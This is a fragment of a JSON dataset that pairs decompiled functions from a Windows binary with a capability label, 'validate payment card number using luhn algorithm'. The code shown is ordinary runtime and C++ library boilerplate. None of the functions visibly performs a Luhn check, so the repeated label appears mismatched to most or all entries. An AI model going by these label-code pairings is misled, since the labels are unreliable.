        "decompiled_code": "\nvoid __cdecl\nfcn.00418a10(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e340;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_10h = 0;\n    var_20h = in_ECX;\n    fcn.00402dd3(var_8h + 4, in_ECX + 1);\n    *var_20h = vtable.std::_System_error.0;\n    *(var_20h + 3) = *(var_8h + 0xc);\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 314
    },
    "00402a27": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402a27(int32_t param_1)\n\n{\n    fcn.004040d9(*(param_1 + 8));\n    fcn.004040d9(*(param_1 + 0xc));\n    fcn.004040d9(*(param_1 + 0x10));\n    return;\n}\n",
        "token_count": 74
    },
    "00402a2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402a2c(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x32) != 0x2a) {\n        uVar2 = fcn.00402f18(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 196
    },
    "00402a68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a68(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00401f32(arg_8h, arg_ch, arg_10h, arg_14h, 0);\n    return;\n}\n",
        "token_count": 67
    },
    "00402a8b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a8b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.0040105f(arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 57
    },
    "00404e94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404e94(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.0040578b();\n    if (iVar2 != 0) {\n        fcn.00405b7d(0x16);\n    }\n    if ((*0x56ce64 & 2) != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0x17);\n        if (iVar2 != 0) {\n            pcVar1 = swi(0x29);\n            (*pcVar1)();\n        }\n        fcn.00405998(3, 0x40000015, 1);\n    }\n    fcn.00405fc9(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 186
    },
    "00402ae5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ae5(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar1 = arg_8h[4];\n    if (0xf < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    if (uVar1 < 0x10) {\n        *in_ECX = *arg_8h;\n        in_ECX[1] = arg_8h[1];\n        in_ECX[2] = arg_8h[2];\n        in_ECX[3] = arg_8h[3];\n        uVar3 = 0xf;\n    }\n    else {\n        uVar3 = 0x7fffffff;\n        if ((uVar1 | 0xf) < 0x80000000) {\n            uVar3 = uVar1 | 0xf;\n        }\n        uVar2 = fcn.00406000(uVar3 + 1);\n        *in_ECX = uVar2;\n        fcn.0040576d(uVar2, arg_8h, uVar1 + 1);\n    }\n    in_ECX[4] = uVar1;\n    in_ECX[5] = uVar3;\n    return;\n}\n",
        "token_count": 308
    },
    "00402b0d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00402b0d(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    uStack40 = 0;\n    for (; uVar1 = *arg_ch,  uVar1 != 0; arg_ch = arg_ch + 1) {\n        puVar2 = &uStack40 + (uVar1 >> 3);\n        *puVar2 = *puVar2 | '\\x01' << (uVar1 & 7);\n    }\n    do {\n        puVar3 = arg_8h;\n        puVar2 = *puVar3;\n        if (*puVar3 == 0) {\n            return puVar2;\n        }\n        arg_8h = puVar3 + 1;\n    } while ((*(&uStack40 + (puVar2 >> 3)) >> (puVar2 & 7) & 1) == 0);\n    return puVar3;\n}\n",
        "token_count": 340
    },
    "00402b53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl\nfcn.00402b53(uint lpLocaleName, uint32_t dwMapFlags, uint lpMultiByteStr, int32_t arg_14h, uint arg_18h, int32_t arg_1ch\n            , uint CodePage, int32_t arg_24h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    int32_t iStack44;\n    uint var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = arg_14h;\n    if (0 < arg_14h) {\n        iStack44 = 0x4671eb;\n        iVar1 = fcn.004027e8(lpMultiByteStr, arg_14h);\n        iVar4 = iVar1 + 1;\n        if (arg_14h <= iVar1) {\n            iVar4 = iVar1;\n        }\n    }\n    uStack48 = lpMultiByteStr;\n    iStack52 = (arg_24h != 0) * 8 + 1;\n    uStack56 = CodePage;\n    puVar3 = &stack0xffffffc8;\n    iStack44 = iVar4;\n    iVar1 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n    if (iVar1 == 0) goto code_r0x00467382;\n    uVar2 = iVar1 * 2 + 8;\n    uVar2 = -(iVar1 * 2 < uVar2) & uVar2;\n    if (uVar2 != 0) {\n        if (uVar2 < 0x401) {\n            fcn.0040349f();\n            if (*0x10 != 0x38) {\n                uStack56 = 0xcccc;\n                puVar3 = &stack0xffffffc8;\ncode_r0x00467263:\n                puVar3 = puVar3 + 2;\n            }\n        }\n        else {\n            puVar3 = fcn.0040159b(uVar2);\n            if (puVar3 != NULL) {\n                *puVar3 = 0xdddd;\n                goto code_r0x00467263;\n            }\n        }\n        if ((puVar3 != NULL) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 1, lpMultiByteStr, iVar4, puVar3, iVar1), \n           iVar4 != 0)) {\n            puVar5 = &stack0xffffffc8;\n            iVar4 = (*_sym.imp.KERNEL32.dll_LCMapStringEx)(lpLocaleName, dwMapFlags, puVar3, iVar1, 0, 0, 0, 0, 0);\n            if (iVar4 != 0) {\n                if ((dwMapFlags & 0x400) == 0) {\n                    uVar2 = iVar4 * 2 + 8;\n                    uVar2 = -(iVar4 * 2 < uVar2) & uVar2;\n                    if (uVar2 != 0) {\n                        if (uVar2 < 0x401) {\n                            fcn.0040349f();\n                            if (*0x10 != 0x38) {\n                                uStack56 = 0xcccc;\n                                puVar5 = &stack0xffffffc8;\ncode_r0x0046731b:\n                                puVar5 = puVar5 + 2;\n                            }\n                        }\n                        else {\n                            puVar5 = fcn.0040159b(uVar2);\n                            if (puVar5 != NULL) {\n                                *puVar5 = 0xdddd;\n                                goto code_r0x0046731b;\n                            }\n                        }\n                        if ((puVar5 != NULL) &&\n                           (iVar6 = (*_sym.imp.KERNEL32.dll_LCMapStringEx)\n                                              (lpLocaleName, dwMapFlags, puVar3, iVar1, puVar5, iVar4, 0, 0, 0), \n                           iVar6 != 0)) {\n                            if (arg_1ch == 0) {\n                                arg_1ch = 0;\n                                arg_18h = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                      (CodePage, 0, puVar5, iVar4, arg_18h, arg_1ch, 0, 0);\n                        }\n                    }\n                    fcn.004037ab();\n                }\n                else if ((arg_1ch != 0) && (iVar4 <= arg_1ch)) {\n                    (*_sym.imp.KERNEL32.dll_LCMapStringEx)\n                              (lpLocaleName, dwMapFlags, puVar3, iVar1, arg_18h, arg_1ch, 0, 0, 0);\n                }\n            }\n        }\n    }\n    fcn.004037ab();\ncode_r0x00467382:\n    fcn.00403085(iVar1);\n    return;\n}\n",
        "token_count": 1173
    },
    "00402bb2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402bb2(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uStack20;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        piVar3 = arg_8h;\n        if (arg_10h != 0) {\n            do {\n                if (*piVar3 == 0) break;\n                piVar3 = piVar3 + 1;\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            if (arg_ch != 0) {\n                arg_10h = arg_10h - piVar3;\n                do {\n                    iVar1 = *(arg_10h + piVar3);\n                    *piVar3 = iVar1;\n                    piVar3 = piVar3 + 1;\n                    if (iVar1 == 0) break;\n                    arg_ch = arg_ch + -1;\n                } while (arg_ch != 0);\n                if (arg_ch != 0) {\n                    return 0;\n                }\n                *arg_8h = 0;\n                puVar2 = fcn.004039a4();\n                uStack20 = 0x22;\n                goto code_r0x004c98f2;\n            }\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.004039a4();\n    uStack20 = 0x16;\ncode_r0x004c98f2:\n    *puVar2 = uStack20;\n    fcn.00403751();\n    return uStack20;\n}\n",
        "token_count": 383
    },
    "0047b643": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.0047b643(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    uint var_4ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar1 = fcn.00406843(in_ECX, &var_ch, 0x54d9f0, *(arg_14h + 0x14));\n    uVar1 = fcn.004054ed(&var_4ch, 0x40, uVar1, arg_1ch);\n    fcn.004030df(in_ECX, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_4ch, uVar1);\n    fcn.00403085(var_4ch);\n    return;\n}\n",
        "token_count": 247
    },
    "00402c16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402c16(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    uint uVar1;\n    int32_t iVar2;\n    \n    arg_8h = param_1 + 0x24;\n    if (*(param_1 + 0x31) != '*') {\n        uVar1 = fcn.00405f60(arg_8h);\n        return uVar1;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar2 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar2;\n    if (iVar2 < 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 4;\n        iVar2 = -iVar2;\n        *arg_8h = iVar2;\n    }\n    return CONCAT31(iVar2 >> 8, 1);\n}\n",
        "token_count": 225
    },
    "00402c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402c20(uint arg_8h)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = fcn.00491b6a(1, \"FlsFree\", 0x54fb1c, 0x54fb24);\n    if (pcVar1 == NULL) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(arg_8h);\n    }\n    else {\n        (**0x573000)();\n        (*pcVar1)();\n    }\n    return;\n}\n",
        "token_count": 114
    },
    "00402c52": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402c52(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        fcn.004040d9(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 59
    },
    "00402cb6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402cb6(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if ((arg_ch == 0) || (arg_10h <= 0xffffffe0 / arg_ch)) {\n        if (arg_8h == 0) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = fcn.00401203(arg_8h);\n        }\n        arg_ch = arg_ch * arg_10h;\n        iVar2 = fcn.0040437c(arg_8h, arg_ch);\n        if ((iVar2 != 0) && (uVar3 < arg_ch)) {\n            fcn.0040314d(iVar2 + uVar3, 0, arg_ch - uVar3);\n        }\n    }\n    else {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0xc;\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 249
    },
    "00402cde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402cde(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004c8177(0x1e, \"AppPolicyGetShowDeveloperDiagnostic\", 0x553564, \"AppPolicyGetShowDeveloperDiagnostic\");\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x573000)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 134
    },
    "00402d1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d1a(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    \n    in_ECX[2] = arg_10h;\n    *in_ECX = arg_8h;\n    in_ECX[1] = arg_ch;\n    *(in_ECX + 3) = 0;\n    iVar2 = fcn.00405a92(arg_8h, arg_ch, arg_10h + 0x250, 0x55);\n    if (iVar2 == 0) {\n        return;\n    }\n    fcn.004035f8(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 193
    },
    "00402d42": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00402d42(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_8h_00;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004030e9(8);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0;\n    if (*(unaff_EBP + 0x10) != 0) {\n        *extraout_ECX = 0x54c3d8;\n        extraout_ECX[4] = 0;\n        extraout_ECX[0xc] = 0;\n        extraout_ECX[0xd] = 0;\n        extraout_ECX[0xe] = 0;\n        extraout_ECX[2] = vtable.std::basic_ios_char__struct_std::char_traits_char__.0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x10) = 1;\n    }\n    arg_ch_00 = *(unaff_EBP + 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(extraout_ECX + *(*extraout_ECX + 4)) = vtable.std::basic_ostream_char__struct_std::char_traits_char__.0;\n    *(*(*extraout_ECX + 4) + -4 + extraout_ECX) = *(*extraout_ECX + 4) + -8;\n    fcn.0040493f(arg_8h_00, arg_ch_00);\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 424
    },
    "00402de2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402de2(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    if (arg_ch - arg_8h < arg_14h) {\n        arg_14h = arg_ch - arg_8h;\n    }\n    fcn.00491789(arg_8h, arg_10h, arg_14h);\n    return arg_8h + arg_14h;\n}\n",
        "token_count": 110
    },
    "00402e0a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402e0a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_8h != 0) {\n        iVar1 = arg_8h;\n        if (arg_8h != arg_8h + 0xe00) {\n            do {\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(iVar1);\n                iVar1 = iVar1 + 0x38;\n            } while (iVar1 != arg_8h + 0xe00);\n        }\n        fcn.00406302(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00417f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00417f50(int32_t noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e290;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_10h = 0;\n    var_20h = in_ECX;\n    fcn.00402dd3(noname_0 + 4, in_ECX + 1);\n    *var_20h = vtable.std::bad_array_new_length.0;\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 288
    },
    "00402ec3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402ec3(int32_t param_1)\n\n{\n    fcn.004040d9(*(param_1 + 8));\n    fcn.004040d9(*(param_1 + 0x10));\n    fcn.004040d9(*(param_1 + 0x14));\n    return;\n}\n",
        "token_count": 75
    },
    "00402ecd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402ecd(uint arg_8h)\n\n{\n    int16_t *piVar1;\n    uint *puVar2;\n    int16_t **in_ECX;\n    \n    piVar1 = *in_ECX;\n    *in_ECX = piVar1 + -1;\n    if ((arg_8h != 0) && (piVar1[-1] != arg_8h)) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00402ee6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402ee6(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403bfc(arg_8h, arg_8h + 0x16, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 85
    },
    "00402eeb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402eeb(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004034cc(arg_8h, arg_8h + 0xe, &arg_ch);\n    return iVar1 - arg_8h;\n}\n",
        "token_count": 80
    },
    "00402f09": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f09(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (in_ECX[5] - iVar1 < arg_8h) {\n        fcn.004044df(arg_8h, in_ECX, arg_8h, arg_ch);\n    }\n    else {\n        in_ECX[4] = iVar1 + arg_8h;\n        if (7 < in_ECX[5]) {\n            in_ECX = *in_ECX;\n        }\n        fcn.00404c50(in_ECX + iVar1 * 2, arg_ch, arg_8h);\n        *(in_ECX + (iVar1 + arg_8h) * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "00402f0e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402f0e(code *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    iVar1 = in_ECX + 4;\n    for (; in_ECX != iVar1; in_ECX = in_ECX + 4) {\n        (**0x573000)(in_ECX);\n        (*arg_8h)();\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00402f77": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00402f77(uint noname_0, uchar *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    ushort *puVar1;\n    ushort *puVar2;\n    char cVar3;\n    uint32_t uVar4;\n    \n    *arg_ch = 0x25;\n    puVar1 = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        *puVar1 = 0x2b;\n        puVar1 = arg_ch + 2;\n    }\n    if ((arg_14h & 0x10) != 0) {\n        *puVar1 = 0x23;\n        puVar1 = puVar1 + 1;\n    }\n    *puVar1 = 0x2a2e;\n    puVar2 = puVar1 + 1;\n    if (arg_10h != '\\0') {\n        *puVar2 = arg_10h;\n        puVar2 = puVar1 + 3;\n    }\n    uVar4 = arg_14h & 0x3000;\n    if ((arg_14h & 4) == 0) {\n        if (uVar4 != 0x2000) {\n            if (uVar4 == 0x3000) {\n                cVar3 = 'a';\n            }\n            else {\n                cVar3 = (uVar4 != 0x1000) * '\\x02' + 'e';\n            }\n            goto code_r0x0046c305;\n        }\n    }\n    else if (uVar4 != 0x2000) {\n        if (uVar4 == 0x3000) {\n            cVar3 = 'A';\n        }\n        else {\n            cVar3 = (uVar4 != 0x1000) * '\\x02' + 'E';\n        }\n        goto code_r0x0046c305;\n    }\n    cVar3 = 'f';\ncode_r0x0046c305:\n    *puVar2 = cVar3;\n    *(puVar2 + 1) = 0;\n    return arg_ch;\n}\n",
        "token_count": 480
    },
    "0041daf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0041daf0(int32_t noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e4f0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_10h = 0;\n    var_20h = in_ECX;\n    fcn.00402dd3(noname_0 + 4, in_ECX + 1);\n    *var_20h = vtable.std::bad_cast.0;\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 288
    },
    "00402fea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402fea(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    do {\n        uVar1 = *arg_8h;\n        if (uVar1 - 0x41 < 0x1a) {\n            uVar1 = uVar1 + 0x20;\n        }\n        uVar2 = *arg_ch;\n        arg_8h = arg_8h + 1;\n        if (uVar2 - 0x41 < 0x1a) {\n            uVar2 = uVar2 + 0x20;\n        }\n        arg_ch = arg_ch + 1;\n    } while ((uVar1 == uVar2) && (uVar1 != 0));\n    return;\n}\n",
        "token_count": 186
    },
    "00403017": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403017(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint *in_ECX;\n    uint *puVar1;\n    uint var_4h;\n    \n    if (arg_ch < in_ECX[5] || arg_ch == in_ECX[5]) {\n        puVar1 = in_ECX;\n        if (0xf < in_ECX[5]) {\n            puVar1 = *in_ECX;\n        }\n        in_ECX[4] = arg_ch;\n        fcn.004058f3(puVar1, arg_8h, arg_ch);\n        *(puVar1 + arg_ch) = 0;\n    }\n    else {\n        fcn.00403490(arg_ch, in_ECX, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "0040306c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.0040306c(char *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    char *pcVar5;\n    char *lpMultiByteStr;\n    int32_t iVar6;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    ushort *var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_10h = 0;\n    pcVar5 = arg_8h;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar6 = 0;\n    pcVar5 = pcVar5 + (1 - (arg_8h + 1));\n    var_8h = pcVar5;\n    lpMultiByteStr = arg_8h;\n    while ((pcVar5 != NULL && (iVar3 = fcn.00403cdd(&var_4h, lpMultiByteStr, pcVar5, &var_14h, arg_10h),  0 < iVar3))) {\n        lpMultiByteStr = lpMultiByteStr + iVar3;\n        iVar6 = iVar6 + 1;\n        pcVar5 = pcVar5 + -iVar3;\n    }\n    iVar6 = iVar6 + 1;\n    var_ch = fcn.00403387(iVar6, 2);\n    if (var_ch != NULL) {\n        var_1ch = 0;\n        var_18h = 0;\n        puVar4 = var_ch;\n        while ((iVar6 != 0 && (iVar3 = fcn.00403cdd(puVar4, arg_8h, var_8h, &var_1ch, arg_10h),  0 < iVar3))) {\n            arg_8h = arg_8h + iVar3;\n            puVar4 = puVar4 + 1;\n            iVar6 = iVar6 + -1;\n        }\n        *puVar4 = 0;\n        return var_ch;\n    }\n    fcn.004010a5();\n    pcVar2 = swi(3);\n    puVar4 = (*pcVar2)();\n    return puVar4;\n}\n",
        "token_count": 543
    },
    "004030d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
